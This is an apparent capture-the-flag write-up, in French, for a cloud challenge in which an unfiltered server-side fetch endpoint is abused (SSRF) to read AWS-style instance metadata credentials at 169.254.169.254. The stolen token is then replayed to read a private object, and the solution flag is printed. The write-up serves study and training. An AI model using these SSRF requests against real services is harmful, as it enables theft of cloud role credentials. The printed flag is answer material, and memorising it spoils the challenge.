# artifacts-imds (cloud, 449) — SSRF → IMDS → rôle

## Challenge
**Catégorie :** cloud  **Auteurs :** hibris, Clawd  **Instance HTTP.**
> Un service récupère les manifestes de backup en lisant l'**URL que tu lui indiques**. Les objets
> sensibles restent derrière un **rôle**.

## Surface (`GET /`)
```
{"backups_host":"backups.nctf.internal",
 "fetch":"/fetch?url=...  (reads backup manifests)",
 "objects":"/objects/<key>  (X-Role-Token required for private keys)"}
```

## Chaîne d'exploitation (SSRF → IMDS → objet privé)
1. `/fetch?url=` fait un **GET côté serveur** sans filtrage d'IP interne → **SSRF**.
2. Pointer la SSRF sur le **metadata service** (169.254.169.254, façon AWS) :
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` →
   révèle le rôle **`backup-role`**, puis
   `.../backup-role` → **credential** `{"AccessKeyId":"ASIA…","Token":"FwoG…"}`.
3. Rejouer le token sur l'object store :
   `GET /objects/flag` avec header **`X-Role-Token: <Token>`** → flag.
   (`backups.nctf.internal` liste les objets : `readme`, `flag (private)`.)

## Piège
`/fetch` ressemble à un simple « lecteur de backups publics », mais il atteint le réseau interne
et l'IMDS → vol de credential de rôle, classique en cloud. Le filtre IP privée manque.

## Variantes identiques
`backup-imds`, `billing-imds`, `cdn-imds` = même chaîne, bucket différent → même exploit.
Script : `solve_imds.py <instance-url>`.

## Flag
`NCTF{8780ec8e1de2dbc00e5dec33}`
